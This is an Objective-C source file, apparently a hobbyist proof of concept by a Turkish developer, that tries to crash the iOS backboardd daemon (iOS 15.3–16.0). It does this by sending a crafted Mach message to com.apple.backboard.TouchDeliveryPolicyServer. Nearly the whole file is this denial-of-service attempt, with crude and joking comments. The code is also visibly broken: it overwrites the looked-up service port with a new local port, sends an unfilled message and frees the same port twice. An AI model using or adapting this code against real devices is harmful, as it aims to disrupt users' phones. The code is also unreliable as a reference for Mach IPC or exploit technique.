//
//  turkish_bomber_AAPL.m
//  iam_your_bank_account
//
//  Created by Ali on 25.03.2023.
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <mach/port.h>
#import <QuartzCore/QuartzCore.h>
#include <mach/message.h>

//  Developed wen? 25.03/2023

//  Kod incelenmeye açıktır, eğer geliştirilirse XPC üzerinde backboardd crashlanıp orjinal sürümde Respring atılabilir. tabiki bu iOS15.3 - 16.0 üzerinde geçerlidir

//  Developed by aliy_2001 you can follow me on Instagram buddy

//  With love from Turkey


bootstrap_look_up(mach_port_t bp, const char* service_name, mach_port_t *sp);
void LOG(const char *msg) {
    printf(msg);
}

void turkish_bomber_AAPL(){
    
       // we are going to do something which will try to crash backboardd without calling XPC_Service
       printf("damn gonna try something...");
       
       mach_port_t port_antiporn = mach_task_self();
       mach_port_t clientbitch = current_task();

       mach_port_name_t port_name;
       kern_return_t woodo_magic_sum = mach_port_allocate(port_antiporn, MACH_PORT_RIGHT_RECEIVE, &port_name);

       if (woodo_magic_sum == KERN_SUCCESS) {
           
           printf("we got receive? can we manipulate it for fake all_access which might give us a clone?");
           mach_port_t service_port;
           kern_return_t bootstrap_result = bootstrap_look_up(bootstrap_port, "com.apple.backboard.TouchDeliveryPolicyServer", &service_port);
           if (bootstrap_result == KERN_SUCCESS) {
               
               // some stuff you may not be able to understand bruh...
               NSLog(@"our_structed_port %u",service_port);
               vm_offset_t buffer;
               size_t buffer_size = 2000; // örnek olarak 1024 byte bellek alanı ayırıyoruz
               
               kern_return_t qtx = vm_allocate(port_antiporn, &buffer, buffer_size, VM_FLAGS_ANYWHERE);
             
                   
                   // buda deneme bloğu sahte bir XPC mesaj alanı oluşturma
              
                   kern_return_t err;

                   // com.apple.backboard.system servisini bul
                   mach_port_t bootstrap_port;
                   task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
                   err = bootstrap_look_up(bootstrap_port, "com.apple.backboard.TouchDeliveryPolicyServer", &service_port);
                   if (err != KERN_SUCCESS) {
                       NSLog(@"Servis bulunamadı: %s", mach_error_string(err));
                       return;
                   }

                   // mach portu oluştur
                   err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &service_port);
                   if (err != KERN_SUCCESS) {
                       NSLog(@"Mach portu oluşturulurken bir hata oluştu: %s", mach_error_string(err));
                       return;
                   }
               NSString* addr = [NSString stringWithFormat:@"%d", service_port];
               NSString* strclient = [NSString stringWithFormat:@"%d", port_antiporn];
               //_msgui.text = [NSString stringWithFormat:@"bootstrap? 0x%@ \nclient? 0x%@\nbuggy sometimes fails\nthis is made by a turkish dev aka aliy_2001\nto be implemented to modify xpc_services", addr,strclient];
                   // mach port descriptor'ı oluştur
                   mach_msg_port_descriptor_t port_descriptor = {
                       .name = port_antiporn,
                       .disposition = MACH_MSG_TYPE_MAKE_SEND,
                       .type = MACH_MSG_PORT_DESCRIPTOR
                   };

                   // mesajı gönder
               mach_msg_header_t *hdr = (mach_msg_header_t *)malloc(sizeof(mach_msg_header_t) + 256 + 1);
           
               hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
               hdr->msgh_size = sizeof(mach_msg_header_t) +256;
               hdr->msgh_remote_port = service_port;
               hdr->msgh_local_port = port_antiporn;
               hdr->msgh_id = 'zuut';
               
               err = mach_msg(hdr,               // mesaj başlığı
                              MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                                               256,
                                               0,
                                               MACH_PORT_NULL,
                                               MACH_MSG_TIMEOUT_NONE,
                                               MACH_PORT_NULL); // notify portu (geçersiz)

               if (err != KERN_SUCCESS) {
                   NSLog(@"açılan XPC yolundan mesaj atılırken fail olduk be kanki : %s", mach_error_string(err));
                
               }

               mach_port_deallocate(port_antiporn, port_name);

                   // descriptor'ı serbest bırak

             
                  
                   
               
                  
                   
                       
                   
                   mach_port_deallocate(port_antiporn, port_name);
                   // burdan sonra kapat bakalım kapayabilirsen canımın içi...
                   
               } else {
                   NSLog(@"Failed to find the service port, error: %d", bootstrap_result);
               }
           
           
           
       }
       
}
